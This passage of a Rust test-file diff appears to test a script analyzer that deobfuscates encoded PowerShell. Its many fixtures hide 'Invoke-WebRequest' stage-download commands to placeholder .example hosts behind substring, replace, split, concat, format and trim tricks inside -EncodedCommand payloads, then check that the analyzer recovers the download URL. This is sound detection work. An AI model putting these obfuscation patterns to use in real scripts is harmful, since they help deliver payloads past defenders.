+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Get-Text($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Get-Text '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-hyphen-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "hyphenated-function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_scoped_function_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-scoped-function-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function script:Get-Text($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Get-Text '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-scoped-function-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "scoped-function extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_substring_extractor_named_args_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-substring-named-args-extractor.example/stage.ps1";
+        let carrier = format!("xxx{}yyy", decoded);
+        let inner = format!(
+            r#"function Pick($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Pick -count {len} -value '{carrier}' -start 3"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-substring-named-args-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "named-argument literal substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_substring_extractor_without_return_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-extractor-implicit.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Pick($value,$start,$count) {{
+  $value.Substring($start,$count)
+}}
+Pick '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-extractor-implicit.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "implicit-output substring extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value,$needle,$replacement) {{
+  return $value -replace $needle,$replacement
+}}
+Clean '{obfuscated}' '~' ''"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-replace-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~o~r~d~e~r~e~d~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($unused,$value,$needle,$replacement) {{
+  return $value -replace $needle,$replacement
+}}
+Clean 0 '{obfuscated}' '~' ''"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-replace-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_dot_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n~s~t~-~d~o~t~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value) {{
+  return $value.Replace('~','')
+}}
+Clean '{obfuscated}'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-dot-replace-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant dot-replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_dash_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n~s~t~-~d~a~s~h~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value) {{
+  return $value -replace '~',''
+}}
+Clean '{obfuscated}'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-dash-replace-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant dash-replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_replace_extractor_named_args_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p~l~a~c~e~-~n~a~m~e~d~-~a~r~g~s~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value,$needle,$replacement) {{
+  return $value -replace $needle,$replacement
+}}
+Clean -replacement '' -needle '~' -value '{obfuscated}'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-replace-named-args-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "named-argument literal replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_dot_replace_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let obfuscated =
+            "I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~d~o~t~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1";
+        let inner = format!(
+            r#"function Clean($value,$needle,$replacement) {{
+  return $value.Replace($needle,$replacement)
+}}
+Clean '{obfuscated}' '~' ''"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-dot-replace-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal dot-replace extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_split_index_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value,$sep,$index) {{
+  return $value.Split($sep)[$index]
+}}
+Piece 'noise|{decoded}|tail' '|' 1"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-split-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_split_index_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-split-reordered-dummy.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($unused,$value,$sep,$index) {{
+  return $value.Split($sep)[$index]
+}}
+Piece 0 'noise|{decoded}|tail' '|' 1"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-split-reordered-dummy.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(decoded),
+            "literal reordered split-index extractor output was not retained:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_split_index_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-split-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value) {{
+  return $value.Split('|')[1]
+}}
+Piece 'noise|{decoded}|tail'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-split-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_const_sep_split_index_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-const-sep-split-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value,$index) {{
+  return $value.Split('|')[$index]
+}}
+Piece 'noise|{decoded}|tail' 1"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-sep-split-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal const-separator split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$right) {
+  return $left + $right
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal concatenator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_multi_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-multi-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return $left + $middle + $right
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-multi' '-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "multi-part literal concatenator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Concat($left,$middle,$right)
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal [string]::Concat extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_concat_array_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-concat-array-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Concat(@($left,$middle,$right))
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-concat-array-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal [string]::Concat array extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_join_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-join-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return [string]::Join('', @($left,$middle,$right))
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-string' '-join-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal [string]::Join extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f $left,$middle,$right
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-format' '-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal format extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_string_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-string-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return [string]::Format('{0}{1}{2}', $left,$middle,$right)
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-string' '-format-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal [string]::Format extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_array_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-array-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f @($left,$middle,$right)
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-array' '-format-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal array format extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_split_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value) {{
+  return ($value -split '|')[1]
+}}
+Piece 'noise|{decoded}|tail'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-split-operator.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant split-operator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_split_index_extractor_named_args_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-split-named-args-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value,$sep,$index) {{
+  return $value.Split($sep)[$index]
+}}
+Piece -index 1 -value 'noise|{decoded}|tail' -sep '|'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-split-named-args-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "named-argument literal split-index extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-trim-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($unused,$value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean 0 '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-trim-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_constant_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value) {{
+  return $value.Trim('~')
+}}
+Clean '~~~{decoded}~~~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-const-trim-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal constant trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_constant_trim_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-const-trim-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($unused,$value) {{
+  return $value.Trim('~')
+}}
+Clean 0 '~~~{decoded}~~~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-const-trim-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered constant trim extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_trim_extractor_named_args_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.Trim($chars)
+}}
+Clean -chars '~' -value '~~~{decoded}~~~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-trim-named-args-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal trim extractor named-args call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_trimstart_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-trimstart-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value,$chars) {{
+  return $value.TrimStart($chars)
+}}
+Clean '~~~{decoded}' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-trimstart-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal trimstart extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_trim_no_arg_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Clean($value) {{
+  return $value.Trim()
+}}
